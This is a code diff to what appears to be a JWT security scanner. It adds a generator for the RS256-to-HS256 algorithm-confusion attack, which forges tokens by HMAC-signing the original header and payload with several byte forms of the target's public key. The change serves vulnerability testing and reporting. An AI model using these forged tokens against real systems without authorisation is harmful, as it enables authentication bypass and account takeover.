@@ -40,6 +40,8 @@ import inspect
 import json
 import time
 import uuid
+import hmac
+import hashlib
 from datetime import datetime
 from typing import Any, Dict, List, Optional
 from urllib.parse import urlparse
@@ -54,6 +56,7 @@ from utils.jwt_utils import (
     encode_jwt,
     psychic_signature_segment,
     verify_hmac_secret,
+    _public_key_variants,
 )
 from utils.jwt_attack_models import (
     AttackConfiguration,
@@ -104,6 +107,9 @@ _ATTACK_TYPE_TO_CATEGORY: Dict[AttackType, str] = {
     AttackType.PSYCHIC_SIGNATURE: "JWT_PSYCHIC_SIGNATURE",
     AttackType.TIMESTAMP_TAMPERING: "JWT_TIMESTAMP_TAMPERING_ACCEPTED",
     AttackType.CLAIM_FUZZING: "JWT_CLAIM_FUZZING_ACCEPTED",
+    # RS*/ES* -> HS256 key/algorithm confusion (aka Substitution Attack).
+    # Resolves to CRITICAL / API2 in ``utils.findings.FindingsCollector``.
+    AttackType.ALGORITHM_CONFUSION: "JWT_ALGORITHM_CONFUSION",
 }
 
 # Distinct Finding_Category for a blank/empty-secret acceptance (Req 58.2). The
@@ -541,6 +547,7 @@ class JWTAttackEngine:
             AttackType.PSYCHIC_SIGNATURE: self._generate_psychic_signature,
             AttackType.TIMESTAMP_TAMPERING: self._generate_timestamp_tamper,
             AttackType.CLAIM_FUZZING: self._generate_claim_fuzzing,
+            AttackType.ALGORITHM_CONFUSION: self._generate_algorithm_confusion,
         }
         generator = generators.get(attack_type)
         if generator is None:
@@ -617,6 +624,55 @@ class JWTAttackEngine:
             except Exception as e:
                 self.logger.debug("Weak-secret token encode failed",
                                   secret=secret, error=str(e))
+        return tokens
+
+    def _generate_algorithm_confusion(self) -> List[str]:
+        """ALGORITHM_CONFUSION: RS*/ES* -> HS256 key confusion (Substitution Attack).
+
+        Re-signs the ORIGINAL header/payload as an HS256 token using the
+        target's ASYMMETRIC PUBLIC KEY bytes as the HMAC secret. A server that
+        verifies the forged token with the same public key it uses for RS*/ES*
+        verification treats the attacker-forged HMAC as valid — the classic
+        RS256->HS256 key-confusion bypass.
+
+        Every public-key representation from ``_public_key_variants`` (PEM with
+        and without a trailing newline, DER SubjectPublicKeyInfo, and the x5c
+        certificate DER when the material is a certificate) is tried as the HMAC
+        key, since servers differ in which exact byte form they feed to the
+        verifier. Requires ``public_key_material``; returns an empty list (and
+        logs) when none is supplied or no representation can be derived.
+        """
+        if not self.public_key_material:
+            self.logger.info(
+                "Skipping algorithm-confusion generation; no public key material supplied")
+            return []
+
+        variants = _public_key_variants(self.public_key_material)
+        if not variants:
+            self.logger.info(
+                "No public-key representation derivable; skipping algorithm confusion")
+            return []
+
+        header = self._base_header()
+        header['alg'] = 'HS256'  # switch RS*/ES* -> HS256 (the confusion step)
+        header.setdefault('typ', 'JWT')
+        payload = self._base_payload()
+
+        header_encoded = base64url_encode(
+            json.dumps(header, separators=(',', ':')).encode('utf-8'))
+        payload_encoded = base64url_encode(
+            json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+        signing_input = f"{header_encoded}.{payload_encoded}"
+
+        tokens: List[str] = []
+        for representation_name, key_bytes in variants:
+            try:
+                signature = hmac.new(
+                    key_bytes, signing_input.encode('utf-8'), hashlib.sha256).digest()
+                tokens.append(f"{signing_input}.{base64url_encode(signature)}")
+            except Exception as e:
+                self.logger.debug("Algorithm-confusion token encode failed",
+                                  representation=representation_name, error=str(e))
         return tokens
 
     def _generate_kid_injection(self) -> List[str]:
